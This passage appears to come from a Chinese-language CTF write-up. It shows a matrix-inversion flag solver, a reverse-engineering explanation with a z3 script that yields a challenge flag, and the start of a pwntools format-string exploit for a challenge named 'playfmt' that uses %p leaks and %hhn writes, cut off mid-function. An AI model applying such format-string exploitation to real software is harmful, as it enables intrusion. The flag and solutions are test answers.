class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">]])</span>
<span class="n">res</span> <span class="o">=</span> <span class="s2">"FFFFFF94FFFFFF3800000126FFFFFF28FFFFFC1000000294FFFFFC9E000006EA000000DC00000006FFFFFF0CFFFFFDF6FFFFFA82FFFFFCD000000182000003DE0000014E000002B2FFFFF8D800000174FFFFFAA6FFFFF9D4000001C2FFFFF97C0000035A00000146FFFFFF3CFFFFFA14000001CE000007DCFFFFFD48000000980000085EFFFFFDB0FFFFFFBC0000036EFFFFFF4EFFFFF836000005C0000006AE0000069400000022"</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">)</span>
<span class="n">y</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">42</span><span class="p">):</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s2">"&gt;i"</span><span class="p">,</span><span class="n">tmp</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">y</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
<span class="n">B</span> <span class="o">=</span> <span class="n">mat</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

<span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="o">.</span><span class="n">reshape</span><span class="p">(</span><span class="mi">42</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="n">B</span> <span class="o">=</span> <span class="n">A</span><span class="o">.</span><span class="n">I</span><span class="o">*</span><span class="n">B</span>
<span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="o">.</span><span class="n">reshape</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">42</span><span class="p">)</span>
<span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="o">.</span><span class="n">tolist</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">42</span><span class="p">):</span>
    <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^=</span><span class="n">i</span>
    <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">3</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&amp;=</span><span class="mh">0xff</span>
<span class="k">print</span><span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span><span class="n">B</span><span class="p">)))</span>
</pre></div>
<h2 data-content="1" id="1205f6a9eb471685ed0d3326a9a34cdf">Rev</h2>
<p>不太懂c++，瞎调。</p>
<p>首先在<code>00000001400016A3</code>有两个check，一开始不知道干啥的，随便试</p>
<p>后面看到<code>sub_140002B80</code>里面有isspace和ispunct，猜测跟符号有关。瞎调调出来是用符号分割成几部分，第一个校验3部分，第二个校验第一部分的长度10</p>
<p>之后在<code>0000000140001763</code>附近把第一组异或了0xAB，然后和常量对比。然而常量只有5字节，实在想不出还有啥东西了，就直接跳过了</p>
<p>下一部分校验长度4，然后校验大写字母，然后是A-G，后一字节依次比前一字节大2，得出ACEG</p>
<p>最后一部分先是atoi，然后校验偶数，和两个方程。直接z3求出。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="n">Solver</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
<span class="n">x</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s2">"x"</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">x</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(((</span><span class="mh">0x4D2</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="mh">0x162E</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x112C</span> <span class="o">^</span> <span class="mh">0xABCDDCBA</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xABCDB8B9</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(((</span><span class="mh">0x91E</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="mh">0x2693</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1E61</span> <span class="o">^</span> <span class="mh">0x12336790</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1233FC70</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">())</span>
</pre></div>
<p>得到flag:</p>
<pre><code>suctf{ACEG31415926}</code></pre>
<h1 data-content="1" id="ee2f849be9a74297da40a1f14e0a5eec">Pwn</h1>
<h2 data-content="1" id="b8337bd17b4b6c8b8323848b65d59775">playfmt</h2>
<p>flag在堆上格式化字符串读出来就可以</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
<span class="n">main_ebp_offset</span> <span class="o">=</span> <span class="mi">26</span>

<span class="k">def</span> <span class="nf">format_offset</span><span class="p">(</span><span class="n">format_str</span> <span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">format_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"{}"</span> <span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_target</span><span class="p">(</span><span class="n">offset</span> <span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">format_offset</span><span class="p">(</span><span class="s2">"%{}$p</span><span class="se">\x00</span><span class="s2">"</span> <span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s2">" : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">value</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">text</span>

<span class="k">def</span> <span class="nf">modify_byte</span><span class="p">(</span><span class="n">last_byte</span> <span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">"%"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">last_byte</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"c"</span> <span class="o">+</span> <span class="n">format_offset</span><span class="p">(</span><span class="s2">"%{}$hhn"</span> <span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">addr</span> <span class="p">,</span> <span class="n">value</span> <span class="p">,</span> <span class="n">ebp_offset</span> <span class="p">,</span> <span class="n">ebp_1_offset</span><span class="p">):</span>
    <span class="n">addr_last_byte</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">now_value</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
